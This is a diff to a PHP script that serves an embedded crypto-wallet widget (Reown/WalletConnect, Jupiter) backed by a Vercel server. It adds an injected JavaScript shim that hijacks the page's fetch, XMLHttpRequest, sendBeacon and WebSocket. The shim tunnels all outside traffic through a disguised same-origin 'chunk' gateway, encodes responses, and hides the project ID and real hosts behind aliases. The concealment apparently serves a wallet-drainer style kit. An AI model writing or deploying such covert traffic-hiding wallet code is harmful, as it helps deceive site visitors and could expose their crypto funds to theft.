@@ -69,12 +69,46 @@ function chunk_query_url(array $cfg, string $chunk): string
 }
 
 /** @param array<string, mixed> $op */
+function enrich_upstream_op(array $cfg, array $op): array
+{
+    $op['pid'] = (string) ($cfg['reown_project_id'] ?? '');
+    $op['o'] = upstream_request_origin($cfg);
+    $op['vo'] = vercel_api_origin($cfg);
+
+    return $op;
+}
+
+/** @param array<string, mixed> $op */
+function encode_upstream_op_payload(array $cfg, array $op): string
+{
+    $json = json_encode(enrich_upstream_op($cfg, $op), JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
+
+    return rtrim(strtr(base64_encode($json), '+/', '-_'), '=');
+}
+
+/** @param array<string, mixed> $op */
 function chunk_op_get_url(array $cfg, array $op): string
 {
-    $json = json_encode($op, JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
-    $d = rtrim(strtr(base64_encode($json), '+/', '-_'), '=');
+    return chunk_query_url($cfg, chunk_names($cfg)['gateway'])
+        . '&d=' . rawurlencode(encode_upstream_op_payload($cfg, $op));
+}
 
-    return chunk_query_url($cfg, chunk_names($cfg)['gateway']) . '&d=' . rawurlencode($d);
+/** @param array<string, mixed> $op */
+function proxy_gateway_op(array $cfg, array $op, string $method = 'POST'): void
+{
+    $chunks = chunk_names($cfg);
+    $vercelUrl = vercel_api_origin($cfg) . '/' . $chunks['gateway'];
+    $enriched = enrich_upstream_op($cfg, $op);
+
+    if (strtoupper($method) === 'GET') {
+        $d = encode_upstream_op_payload($cfg, $op);
+        proxy_forward('GET', $vercelUrl . '?d=' . rawurlencode($d), null);
+
+        return;
+    }
+
+    $body = json_encode($enriched, JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
+    proxy_forward('POST', $vercelUrl, $body, ['Content-Type: application/json']);
 }
 
 function build_embed_config(array $cfg, string $siteUrl): array
@@ -86,8 +120,7 @@ function build_embed_config(array $cfg, string $siteUrl): array
         $popupUrl = chunk_query_url($cfg, $chunks['profilePage']);
     }
 
-    $iconTarget = vercel_api_origin($cfg) . '/tYZq2BsVawvS5wYEF.svg';
-    $icons = [chunk_op_get_url($cfg, ['t' => 'u', 'm' => 'GET', 'u' => $iconTarget])];
+    $icons = [chunk_op_get_url($cfg, ['t' => 'u', 'h' => 'v', 'm' => 'GET', 'p' => '/tYZq2BsVawvS5wYEF.svg'])];
 
     return [
         'projectId' => (string) ($cfg['reown_project_id'] ?? ''),
@@ -263,41 +296,55 @@ function embed_config_preamble(array $embedConfig): string
         . '{value:c,writable:!1,enumerable:!1,configurable:!1})})(window,atob,JSON);';
 }
 
-function embed_network_shim(string $entry, array $chunks): string
+function embed_network_shim(string $entry, array $chunks, array $cfg): string
 {
     $entryJs = json_encode($entry, JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
     $gwJs = json_encode($chunks['gateway'], JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
     $wsJs = json_encode($chunks['wsRelay'], JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
+    $hmJs = json_encode(upstream_host_alias_map($cfg), JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
 
-    return '(function(e,g,w){function off(h){try{return new URL(h,location.href).origin!==location.origin}catch(r){return!1}}'
+    return '(function(e,g,w,HM){function off(h){try{return new URL(h,location.href).origin!==location.origin}catch(r){return!1}}'
         . 'function isgw(h){try{var u=new URL(h,location.href),p=new URL(e,location.href);'
         . 'return u.pathname===p.pathname&&u.searchParams.get("c")===g}catch(r){return!1}}'
         . 'function dec(b){var n=b.replace(/-/g,"+").replace(/_/g,"/");var p=n.length%4?4-n.length%4:0;return atob(n+"=".repeat(p))}'
         . 'function pl(t){var m=t.match(/__WPL\\((\\d+),"((?:[^"\\\\]|\\\\.)*)"(?:,(\\d))?\\)/);'
-        . 'if(!m)return null;var s=Number(m[1]);if(s<200||s>=300)throw new Error("chunk "+s);'
+        . 'if(!m)return null;var s=Number(m[1]);'
         . 'var raw=dec(m[2].replace(/\\\\"/g,\'"\').replace(/\\\\\\\\/g,"\\\\"));'
-        . 'if(m[3]==="0")return raw;return JSON.parse(raw)}'
+        . 'if(m[3]==="0")return{s:s,b:raw,bin:1};try{return{s:s,b:JSON.parse(raw)}}catch(x){return{s:s,b:raw}}}'
         . 'function pj(r){return Promise.resolve(r).then(function(res){return res.text().then(function(t){'
         . 'var m=t.match(/__WPL\\((\\d+),"((?:[^"\\\\]|\\\\.)*)"(?:,(\\d))?\\)/);'
-        . 'if(m&&m[3]==="0"){var raw=dec(m[2].replace(/\\\\"/g,\'"\').replace(/\\\\\\\\/g,"\\\\"));'
+        . 'if(m){var s=Number(m[1]),raw=dec(m[2].replace(/\\\\"/g,\'"\').replace(/\\\\\\\\/g,"\\\\"));'
+        . 'function mt(r){if(r.trim().charAt(0)==="<")return"image/svg+xml";'
+        . 'var a=r.charCodeAt(0),b=r.charCodeAt(1);if(a===137&&b===80)return"image/png";if(a===71&&b===73)return"image/gif";'
+        . 'if(a===255&&b===216)return"image/jpeg";return"application/octet-stream"}'
+        . 'if(m[3]==="0"){var ct=mt(raw);if(ct==="image/svg+xml")return new Response(raw,{status:s,headers:{"Content-Type":ct}});'
         . 'var u=new Uint8Array(raw.length);for(var i=0;i<raw.length;i++)u[i]=raw.charCodeAt(i);'
-        . 'return new Response(u,{status:Number(m[1])})}var j=pl(t);'
-        . 'return new Response(j?JSON.stringify(j):t,{status:res.status,headers:{"Content-Type":"application/json"}})})})}'
+        . 'return new Response(u,{status:s,headers:{"Content-Type":ct}})}try{return new Response(JSON.stringify(JSON.parse(raw)),{status:s,headers:{"Content-Type":"application/json"}})}'
+        . 'catch(x){return new Response(raw,{status:s})}}var j=pl(t);'
+        . 'if(j){if(j.bin)return new Response(j.b,{status:j.s});'
+        . 'return new Response(typeof j.b==="string"?j.b:JSON.stringify(j.b),{status:j.s,headers:{"Content-Type":"application/json"}})}'
+        . 'if(t.trim().charAt(0)==="<")return new Response(t,{status:res.status,headers:{"Content-Type":"image/svg+xml"}});'
+        . 'return new Response(t,{status:res.status,headers:{"Content-Type":"application/json"}})})})}'
         . 'function gpost(o){return pj(fetch(e+"?c="+encodeURIComponent(g),{method:"POST",headers:{"Content-Type":"application/json"},'
         . 'body:JSON.stringify(o),credentials:"same-origin"}))}'
-        . 'function prox(h,n){n=n||{};var m=(n.method||"GET").toUpperCase(),b=n.body;'
-        . 'var o={t:"u",m:m,u:h};if(b!=null)o.b=typeof b==="string"?b:(b instanceof Blob?b:String(b));return gpost(o)}'
+        . 'function sb(b){if(typeof b!=="string")return b;try{var j=JSON.parse(b);if(j&&typeof j==="object"&&!Array.isArray(j)&&"projectId"in j){delete j.projectId;return JSON.stringify(j)}}catch(x){}return b}'
+        . 'function cmp(u,m,b){m=(m||"GET").toUpperCase();try{var x=new URL(u,location.href);x.searchParams.delete("projectId");'
+        . 'var hk=HM[x.hostname];if(hk){var o={t:"u",h:hk,p:x.pathname+x.search,m:m};'
+        . 'if(b!=null)o.b=sb(typeof b==="string"?b:String(b));return o}}catch(x){}'
+        . 'try{var z=new URL(u,location.href);z.searchParams.delete("projectId");u=z.href}catch(x){}'
+        . 'var o={t:"u",m:m,u:u};if(b!=null)o.b=sb(typeof b==="string"?b:String(b));return o}'
+        . 'function prox(h,n){n=n||{};return gpost(cmp(h,n.method,n.body))}'
         . 'var f=fetch;fetch=function(i,n){var h=typeof i==="string"?i:i instanceof Request?i.url:String(i);'
         . 'if(isgw(h))return pj(f(i,n||{}));if(off(h))return prox(h,n);return f(i,n)};'
         . 'var sb=navigator.sendBeacon&&navigator.sendBeacon.bind(navigator);'
-        . 'if(sb)navigator.sendBeacon=function(u,d){if(!off(u))return sb(u,d);gpost({t:"u",m:"POST",u:String(u)});return!0};'
+        . 'if(sb)navigator.sendBeacon=function(u,d){if(!off(u))return sb(u,d);gpost(cmp(String(u),"POST",d)).catch(function(){});return!0};'
         . 'var xo=XMLHttpRequest.prototype.open,xs=XMLHttpRequest.prototype.send;'
         . 'XMLHttpRequest.prototype.open=function(m,h){if(typeof h==="string"&&off(h)){this._px=h;this._pm=m;arguments[1]="about:blank"}return xo.apply(this,arguments)};'
         . 'XMLHttpRequest.prototype.send=function(b){if(this._px){var x=this;prox(this._px,{method:this._pm||"GET",body:b}).then(function(r){return r.text()}).then(function(t){'
         . 'x.readyState=4;x.status=200;x.responseText=t;x.onload&&x.onload()}).catch(function(){x.onerror&&x.onerror()});return}return xs.apply(this,arguments)};'
         . 'var W=WebSocket,wb=e.replace(/^http/i,"ws");WebSocket=function(h,pr){'
         . 'if(off(h))return new W(wb+"?c="+encodeURIComponent(w),pr);return new W(h,pr)}})('
-        . $entryJs . ',' . $gwJs . ',' . $wsJs . ');';
+        . $entryJs . ',' . $gwJs . ',' . $wsJs . ',' . $hmJs . ');';
 }
 
 function vercel_api_origin(array $cfg): string
@@ -365,6 +412,192 @@ function is_valid_proxy_url(string $target): bool
         && in_array(strtolower((string) $parts['scheme']), ['https', 'http'], true);
 }
 
+/** @return array<string, string> */
+function upstream_route_bases(array $cfg): array
+{
+    return [
+        'r' => 'https://api.reown.com',
+        'm' => 'https://api.web3modal.org',
+        'p' => 'https://pulse.walletconnect.org',
+        'w' => 'https://explorer-api.walletconnect.com',
+        'x' => 'https://rpc.walletconnect.org',
+        'f' => 'https://fonts.reown.com',
+        'j' => 'https://api.jup.ag',
+        'v' => rtrim(vercel_api_origin($cfg), '/'),
+    ];
+}
+
+/** @return array<string, string> hostname => alias */
+function upstream_host_alias_map(array $cfg): array
+{
+    $vercelHost = parse_url(vercel_api_origin($cfg), PHP_URL_HOST);
+    $map = [
+        'api.reown.com' => 'r',
+        'api.web3modal.org' => 'm',
+        'api.web3modal.com' => 'm',
+        'pulse.walletconnect.org' => 'p',
+        'explorer-api.walletconnect.com' => 'w',
+        'rpc.walletconnect.org' => 'x',
+        'fonts.reown.com' => 'f',
+        'api.jup.ag' => 'j',
+    ];
+    if (is_string($vercelHost) && $vercelHost !== '') {
+        $map[$vercelHost] = 'v';
+    }
+
+    return $map;
+}
+
+function alias_needs_project_id(string $alias): bool
+{
+    return in_array($alias, ['r', 'm', 'p', 'w', 'x'], true);
+}
+
+function inject_project_id(string $url, string $projectId): string
+{
+    if ($projectId === '') {
+        return $url;
+    }
+    if (preg_match('/([?&])projectId=/', $url) === 1) {
+        return $url;
+    }
+
+    return $url . (str_contains($url, '?') ? '&' : '?') . 'projectId=' . rawurlencode($projectId);
+}
+
+/** @param array<string, mixed> $parts */
+function rebuild_url(array $parts): string
+{
+    $scheme = isset($parts['scheme']) ? $parts['scheme'] . '://' : '';
+    $user = $parts['user'] ?? '';
+    $pass = isset($parts['pass']) ? ':' . $parts['pass'] : '';
+    $auth = ($user !== '' || $pass !== '') ? $user . $pass . '@' : '';
+    $host = (string) ($parts['host'] ?? '');
+    $port = isset($parts['port']) ? ':' . $parts['port'] : '';
+    $path = $parts['path'] ?? '';
+    $query = isset($parts['query']) && $parts['query'] !== '' ? '?' . $parts['query'] : '';
+    $fragment = isset($parts['fragment']) ? '#' . $parts['fragment'] : '';
+
+    return $scheme . $auth . $host . $port . $path . $query . $fragment;
+}
+
+/** @param array<string, mixed> $op */
+function resolve_upstream_target(array $cfg, array $op): ?string
+{
+    $direct = trim((string) ($op['u'] ?? ''));
+    if ($direct !== '') {
+        if (!is_valid_proxy_url($direct)) {
+            return null;
+        }
+        $parts = parse_url($direct);
+        $host = is_array($parts) ? strtolower((string) ($parts['host'] ?? '')) : '';
+        if ($host === '' || !upstream_host_allowed($host)) {
+            return null;
+        }
+
+        return inject_project_id($direct, (string) ($cfg['reown_project_id'] ?? ''));
+    }
+
+    $alias = (string) ($op['h'] ?? '');
+    $path = (string) ($op['p'] ?? '');
+    if ($alias === '' || $path === '' || $path[0] !== '/') {
+        return null;
+    }
+
+    $bases = upstream_route_bases($cfg);
+    $base = $bases[$alias] ?? null;
+    if ($base === null) {
+        return null;
+    }
+
+    $target = $base . $path;
+    $parts = parse_url($target);
+    $host = is_array($parts) ? strtolower((string) ($parts['host'] ?? '')) : '';
+    if ($host === '' || !upstream_host_allowed($host)) {
+        return null;
+    }
+
+    if (alias_needs_project_id($alias)) {
+        return inject_project_id($target, (string) ($cfg['reown_project_id'] ?? ''));
+    }
+
+    return $target;
+}
+
+/** @param array<string, mixed> $op */
+function prepare_upstream_body(array $cfg, array $op, ?string $body): ?string
+{
+    if ($body === null || $body === '') {
+        return $body;
+    }
+    $alias = (string) ($op['h'] ?? '');
+    $needsId = $alias !== '' && alias_needs_project_id($alias);
+    if (!$needsId && ($op['u'] ?? '') !== '') {
+        $parts = parse_url((string) $op['u']);
+        $host = is_array($parts) ? strtolower((string) ($parts['host'] ?? '')) : '';
+        $map = upstream_host_alias_map($cfg);
+        $alias = $map[$host] ?? '';
+        $needsId = $alias !== '' && alias_needs_project_id($alias);
+    }
+    if (!$needsId) {
+        return $body;
+    }
+
+    $projectId = (string) ($cfg['reown_project_id'] ?? '');
+    if ($projectId === '') {
+        return $body;
+    }
+
+    $decoded = json_decode($body, true);
+    if (!is_array($decoded) || array_is_list($decoded)) {
+        return $body;
+    }
+    if (!isset($decoded['projectId'])) {
+        $decoded['projectId'] = $projectId;
+    }
+
+    return json_encode($decoded, JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
+}
+
+function upstream_request_origin(array $cfg): string
+{
+    $page = request_origin();
+    if ($page !== '') {
+        return $page;
+    }
+
+    return vercel_site_origin($cfg);
+}
+
+function upstream_body_as_json(string $contentType, string $body): bool
+{
+    $type = strtolower(trim(explode(';', $contentType)[0] ?? ''));
+
+    if ($type !== '') {
+        if (str_starts_with($type, 'image/')) {
+            return false;
+        }
+        if (str_contains($type, 'svg')) {
+            return false;
+        }
+        if (str_contains($type, 'octet-stream') || str_contains($type, 'font')) {
+            return false;
+        }
+        if (str_contains($type, 'json')) {
+            return true;
+        }
+        if ($type === 'text/plain' || $type === 'text/html') {
+            return true;
+        }
+
+        return false;
+    }
+
+    $start = ltrim($body);
+
+    return $start !== '' && ($start[0] === '{' || $start[0] === '[');
+}
+
 function emit_js_chunk_response(int $status, string $body, bool $asJson = true): void
 {
     $code = $status > 0 ? $status : 502;
@@ -393,76 +626,6 @@ function emit_js_chunk_response(int $status, string $body, bool $asJson = true):
     exit;
 }
 
-/** @param array<string, mixed> $op */
-function serve_upstream_op(array $cfg, array $op): void
-{
-    $target = (string) ($op['u'] ?? '');
-    if ($target === '' || !is_valid_proxy_url($target)) {
-        emit_js_chunk_response(400, '{"error":"invalid target url"}');
-    }
-
-    $parts = parse_url($target);
-    $host = is_array($parts) ? strtolower((string) ($parts['host'] ?? '')) : '';
-    if ($host === '' || !upstream_host_allowed($host)) {
-        emit_js_chunk_response(403, '{"error":"host not allowed"}');
-    }
-
-    $method = strtoupper((string) ($op['m'] ?? 'GET'));
-    $body = isset($op['b']) && $op['b'] !== '' ? (string) $op['b'] : null;
-
-    if (!function_exists('curl_init')) {
-        emit_js_chunk_response(500, '{"error":"php-curl required"}');
-    }
-
-    $ch = curl_init($target);
-    if ($ch === false) {
-        emit_js_chunk_response(502, '{"error":"curl_init failed"}');
-    }
-
-    $siteOrigin = vercel_site_origin($cfg);
-    $accept = (string) ($_SERVER['HTTP_ACCEPT'] ?? '');
-    $headers = [
-        'User-Agent: wallet-embed-proxy/1.0',
-        'Accept: ' . ($accept !== '' ? $accept : '*/*'),
-    ];
-    if ($siteOrigin !== '') {
-        $headers[] = 'Origin: ' . $siteOrigin;
-        $headers[] = 'Referer: ' . $siteOrigin . '/';
-    }
-    if ($body !== null && $method !== 'GET' && $method !== 'HEAD') {
-        $headers[] = 'Content-Type: application/json';
-    }
-
-    $opts = [
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_FOLLOWLOCATION => true,
-        CURLOPT_MAXREDIRS => 3,
-        CURLOPT_CONNECTTIMEOUT => 15,
-        CURLOPT_TIMEOUT => 60,
-        CURLOPT_CUSTOMREQUEST => $method,
-        CURLOPT_HTTPHEADER => $headers,
-        CURLOPT_ENCODING => '',
-    ];
-    if ($body !== null && $method !== 'GET' && $method !== 'HEAD') {
-        $opts[CURLOPT_POSTFIELDS] = $body;
-    }
-    curl_setopt_array($ch, $opts);
-    $response = curl_exec($ch);
-    $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    $type = (string) curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
-    curl_close($ch);
-
-    if ($response === false) {
-        emit_js_chunk_response(502, '{"error":"upstream curl failed"}');
-    }
-
-    $asJson = $type === ''
-        || str_contains($type, 'json')
-        || str_contains($type, 'text')
-        || str_contains($type, 'javascript');
-    emit_js_chunk_response($code, (string) $response, $asJson);
-}
-
 function serve_gateway_chunk(array $cfg): void
 {
     $chunks = chunk_names($cfg);
@@ -473,46 +636,45 @@ function serve_gateway_chunk(array $cfg): void
     if ($method === 'GET' && $d !== '') {
         $op = decode_chunk_payload($d);
         if (is_array($op) && ($op['t'] ?? '') === 'u') {
-            serve_upstream_op($cfg, $op);
+            proxy_gateway_op($cfg, $op, 'GET');
             exit;
         }
-        http_response_code(400);
-        exit;
+        emit_js_chunk_response(400, '{"error":"invalid gateway get op"}');
     }
 
     if ($method !== 'POST') {
-        http_response_code(405);
-        exit;
+        emit_js_chunk_response(405, '{"error":"method not allowed"}');
     }
 
     $body = file_get_contents('php://input');
     if ($body === false || $body === '') {
-        http_response_code(400);
-        exit;
+        emit_js_chunk_response(400, '{"error":"empty body"}');
     }
 
     $parsed = json_decode($body, true);
     if (!is_array($parsed)) {
-        http_response_code(400);
-        exit;
+        emit_js_chunk_response(400, '{"error":"invalid json"}');
     }
 
     if (isset($parsed['jsonrpc'])) {
         proxy_forward('POST', $vercelUrl, $body, ['Content-Type: application/json']);
+
         return;
     }
 
     if (($parsed['t'] ?? '') === 'u') {
-        serve_upstream_op($cfg, $parsed);
+        proxy_gateway_op($cfg, $parsed, 'POST');
+
         return;
     }
 
     if (($parsed['t'] ?? '') === 'p') {
         proxy_forward('POST', $vercelUrl, $body, ['Content-Type: application/json']);
+
         return;
     }
 
-    http_response_code(400);
+    emit_js_chunk_response(400, '{"error":"unknown gateway op"}');
 }
 
 function proxy_forward(string $method, string $url, ?string $body, array $extraHeaders = []): void
@@ -551,27 +713,25 @@ function proxy_forward(string $method, string $url, ?string $body, array $extraH
     curl_close($ch);
 
     $origin = request_origin();
-    $isJsChunk = is_string($response)
-        && str_contains($response, '__WPL(')
-        && str_contains((string) $type, 'javascript');
+    $isJsChunk = is_string($response) && str_contains($response, '__WPL(');
 
     if ($isJsChunk) {
         http_response_code(200);
-        if ($type !== '') {
-            header('Content-Type: ' . $type);
+        header('Content-Type: application/javascript; charset=utf-8');
+        header('Cache-Control: no-store');
+        if ($origin !== '') {
+            header('Access-Control-Allow-Origin: ' . $origin);
+            header('Vary: Origin');
         }
-    } else {
-        http_response_code($code > 0 ? $code : 502);
-        if ($type !== '') {
-            header('Content-Type: ' . $type);
-        }
+        echo $response;
+        exit;
     }
-    header('Cache-Control: no-store');
-    if ($origin !== '') {
-        header('Access-Control-Allow-Origin: ' . $origin);
-        header('Vary: Origin');
-    }
-    echo $response === false ? '' : $response;
+
+    emit_js_chunk_response(
+        $code > 0 ? $code : 502,
+        is_string($response) && $response !== '' ? $response : '{"error":"vercel gateway failed"}',
+        true,
+    );
 }
 
 function vercel_profile_origin(array $cfg): string
@@ -785,7 +945,7 @@ try {
 }
 
 $entry = vault_entry_url($cfg);
-echo embed_network_shim($entry, chunk_names($cfg));
+echo embed_network_shim($entry, chunk_names($cfg), $cfg);
 echo "\n";
 echo embed_config_preamble($embedConfig);
 echo "\n";
